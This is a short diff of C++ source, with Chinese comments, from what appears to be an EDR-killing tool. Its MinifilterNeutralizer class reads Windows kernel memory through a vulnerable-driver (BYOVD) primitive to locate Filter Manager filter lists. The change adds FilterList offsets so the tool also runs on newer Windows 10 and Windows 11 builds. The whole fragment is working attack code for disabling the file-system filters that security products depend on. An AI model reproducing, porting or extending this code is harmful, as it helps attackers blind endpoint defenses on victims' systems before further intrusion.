@@ -3128,9 +3128,9 @@ uint64_t MinifilterNeutralizer::FindFilterByName(uint64_t fltmgrBase, uint64_t f
         return 0;
     }
 
-    // FLTP_FRAME.FilterList 通常在 +0x140 偏移
-    //  尝试几个已知偏移进行匹配
-    uint64_t filterOffsets[] = { 0x140, 0x148, 0x150, 0x138 };
+    // FLTP_FRAME.FilterList 偏移因 Windows 版本而异 (Win10 21H2:0x140, 22H2:0x158, Win11:0x168)
+    // BUILD 464: 尝试更宽的范围, 包括 Win10 22H2+ 和 Win11 的偏移
+    uint64_t filterOffsets[] = { 0x140, 0x148, 0x150, 0x138, 0x158, 0x160, 0x168, 0x170, 0x178, 0x180 };
     uint64_t filterListHead = 0;
 
     for (uint64_t off : filterOffsets) {
@@ -3138,8 +3138,6 @@ uint64_t MinifilterNeutralizer::FindFilterByName(uint64_t fltmgrBase, uint64_t f
         uint64_t flink = 0, blink = 0;
         if (kma.ReadKernelVA(addr, &flink, sizeof(flink)) &&
             kma.ReadKernelVA(addr + 8, &blink, sizeof(blink))) {
-            // FilterList 非空: Flink → 第一个 FLT_FILTER.ActiveLink
-            //   Flink 应该 != Blink (非空链表), 且 Flink 应在内核池中
             if (flink != addr && flink > 0xFFFF800000000000ULL && blink > 0xFFFF800000000000ULL) {
                 filterListHead = addr;
                 ByovdDiag("FLT:NTRL: FilterList head at frame+0x%llX\n", off);
